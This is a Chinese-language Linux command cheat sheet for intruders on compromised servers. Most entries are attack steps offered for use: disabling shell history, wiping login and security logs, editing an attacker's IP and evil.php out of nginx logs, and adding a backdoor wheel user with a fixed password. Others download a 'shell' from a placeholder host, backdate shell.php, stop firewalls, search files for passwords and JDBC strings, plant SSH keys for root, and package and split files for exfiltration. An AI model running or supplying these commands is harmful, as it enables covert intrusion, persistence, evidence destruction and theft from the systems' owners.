# Linux 命令速查

## 本次不记录命令

```
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
```

## 常用日志清理

```
echo > /var/log/btmp;echo > /var/log/wtmp;echo > /var/log/lastlog;echo > /var/log/utmp;echo > /var/log/syslog;cat /dev/null > /var/log/secure;cat /dev/null > /var/log/message;echo ok
```


- /var/log/btmp   记录所有登录失败信息，使用lastb命令查看
- /var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看
- /var/log/wtmp    记录所有用户的登录、注销信息，使用last命令查看
- /var/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看
- /var/log/secure   记录与安全相关的日志信息
- /var/log/message  记录系统启动后的信息和错误日志

## Web 日志清理

```
直接替换日志ip地址:
sed -i 's/127.0.0.1/192.168.1.1/g' access.log

清除部分相关日志:
使用grep -v来把相关信息删除:
cat /var/log/nginx/access.log | grep -v evil.php > tmp.log

把修改过的日志覆盖到原日志文件:
cat tmp.log > /var/log/nginx/access.log
```


## 设置终端代理

```
export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890
```

## 查看用户登录记录

```
last
```

## root 权限创建管理员用户

```
sudo useradd -m testt && echo "testt:admin@123" | sudo chpasswd && sudo usermod -aG wheel testt
```

## cURL/wget 下载文件

```
wget -P /tmp/ http://x.x.x.x:8080/shell
curl -o /tmp/xxx http://x.x.x.x:8080/shell
```

## 文件时间修改

> 修改 /www/wwwroot/shell.php 时间为 2024.05.16.24

```
touch -t 202405161200.24 /www/wwwroot/shell.php
```

## 查看 DNS 服务器

```
cat /etc/resolv.conf
```

## 停止防火墙

```
systemctl stop firewalld && service iptables stop && ufw disable
```

## 搜索敏感信息

```
find / -regex ".*\.properties\|.*\.conf\|.*\.config\|.*\.yaml\|.*\.sh|.*\.jsp|.*\.log|.*\.txt|.*\.xml" | xargs grep -E "=jdbc:|pass=|passwd=|aliyun|password"
```

## echo 写文件

```
//直接 echo 写入：
echo xxx > /www/xxx.jsp

//base64 写入：
echo eHh4ZGFzMQ== | base64 -d > /www/xxx.jsp

//追加
echo xxx >> /www/xxx.jsp
```

## 写入 ssh 公钥：

```
echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFEazRVTjhFUTFXOFBWMQ== | base64 -d > authorized_keys
```

```
//使用  printf 在末尾处插入，如需换行可添加\n
//参考https://baijiahao.baidu.com/s?id=1727019063436737118&wfr=spider&for=pc

printf "ssh-rsa xxx" >> /root/.ssh/authorized_keys
```

## 压缩打包文件

```
//将 /home/mail /home/web 两个目录打包至 /tmp 目录下命名为web.tar.gz
tar czvf /tmp/web.tar.gz /home/mail /home/web

//zip
zip -r /tmp/web.zip /home/mail /home/web

//可使用 -x 排除，如:
zip -r /tmp/web.zip /home/mail /home/web -x /home/mail/test.txt -x /home/web/log/*
```

## 分割上传

```
split -n 3 fscan  //分割为 3 个文件
split -b 500k fscan  //以 500 K 大小分割 fscan

Windows 合并：
copy /b xaa+xab fscan
type xaa xab > fscan

Linux 合并：
cat xaa xab > fscan
```

